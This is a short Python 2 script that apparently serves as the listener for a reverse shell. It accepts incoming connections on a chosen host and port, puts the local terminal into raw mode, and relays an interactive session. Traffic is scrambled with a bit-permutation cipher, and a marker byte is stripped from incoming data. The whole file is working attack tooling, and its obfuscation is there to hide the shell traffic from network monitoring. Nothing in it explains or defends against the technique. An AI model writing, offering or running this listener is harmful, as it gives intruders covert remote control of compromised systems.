import socket, pty, tty, select
import sys, os

def crypt( xxx, key = [ 7,6,5,4,3,2,1,0 ] ):
    def bin( n ):
        return ''.join( map( lambda y: str((n >> y) & 1), range( 7 , -1, -1 ) ) )

    def perm( c ):
        """ This function is remap one byte to another
            with bit-permutations.
            assert( perm^2 === 1 )
        """
        s = bin( ord( c ) )                                                        ## 3 --> 00000011
        return chr( int( ''.join([ s[ key[ i ] ] for i in xrange( 8 ) ]), 2 ) )    ## return chr( int( 11000000 ) )
    return ''.join( map( perm, xxx ) )


if len( sys.argv ) < 3:
    print "[x] Usage: %s [host] [port]" % ( sys.argv[0] )
else:
    host = str( sys.argv[1] )
    port = int( sys.argv[2] )
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    sock.settimeout( 10 )

    try:
        sock.bind( (host, port) )
        sock.listen( 5 )
    except:
        print "[!] Can't bind !\n"

    tty.setraw( pty.STDIN_FILENO )

    while True:
        #accept connections from outside
        print "[x] Waiting for incoming on %s:%s...\r" % (host, port)
        try:
            (csock, addr) = sock.accept()
            fsock = csock.fileno()
        except socket.timeout:
            continue

        print "[x] Ok....%s\r" % str( addr )
        while True:
            r, w, e = select.select( [ fsock, pty.STDIN_FILENO ], [], [] )
            #print r, str( [ fsock, pty.STDIN_FILENO ] )

            if fsock in r:
                dat = crypt( os.read( fsock, 1000 ) )      ## decrypting...
                if dat:
                    dat = dat.replace( '\x01', '' )        ## strip out magic byte
                    os.write( pty.STDOUT_FILENO, dat )
                else:
                    print "[!] client close connection....\r"
                    break

            if pty.STDIN_FILENO in r:
                dat = os.read( pty.STDIN_FILENO, 1000 )
                os.write( fsock, crypt( dat ) )            ## encrypting...

